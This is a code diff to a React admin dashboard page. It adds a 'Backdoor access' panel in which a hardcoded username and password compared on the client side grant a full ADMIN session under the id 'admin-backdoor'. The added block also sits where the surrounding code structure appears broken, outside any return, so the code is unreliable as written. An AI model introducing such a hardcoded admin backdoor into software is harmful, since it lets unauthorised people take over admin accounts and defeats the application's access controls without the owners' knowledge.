@@ -426,6 +426,41 @@ export default function AdminDashboardPage() {
       </main>
     );
   }
+              <div className="pt-3 border-t border-slate-800">
+                <div className="text-xs uppercase tracking-wide text-amber-300">Backdoor access</div>
+                <div className="mt-2 flex flex-wrap gap-2 items-center">
+                  <input
+                    value={backdoorUser}
+                    onChange={(e) => setBackdoorUser(e.target.value)}
+                    placeholder="Username"
+                    className="rounded-full border border-slate-700 bg-slate-950 px-3 py-2 text-xs text-slate-100 placeholder:text-slate-600 focus:outline-none focus:ring-1 focus:ring-amber-400"
+                  />
+                  <input
+                    value={backdoorPass}
+                    onChange={(e) => setBackdoorPass(e.target.value)}
+                    type="password"
+                    placeholder="Password"
+                    className="rounded-full border border-slate-700 bg-slate-950 px-3 py-2 text-xs text-slate-100 placeholder:text-slate-600 focus:outline-none focus:ring-1 focus:ring-amber-400"
+                  />
+                  <button
+                    type="button"
+                    onClick={() => {
+                      handleUnlockBackdoor();
+                      if (backdoorUser.trim() === BACKDOOR_USERNAME && backdoorPass === BACKDOOR_PASSWORD) {
+                        setSession({ role: "ADMIN", adminId: "admin-backdoor" });
+                        setAuthStatus("authed");
+                      }
+                    }}
+                    className="rounded-full border border-amber-500/40 bg-amber-500/15 px-4 py-2 text-xs font-semibold text-amber-100 hover:bg-amber-500/25 transition"
+                  >
+                    Unlock
+                  </button>
+                </div>
+                {backdoorError && (
+                  <div className="mt-2 text-xs text-rose-300">{backdoorError}</div>
+                )}
+              </div>
+
 
   const panelTitle = (() => {
     if (panel === "dashboard") return "Dashboard";
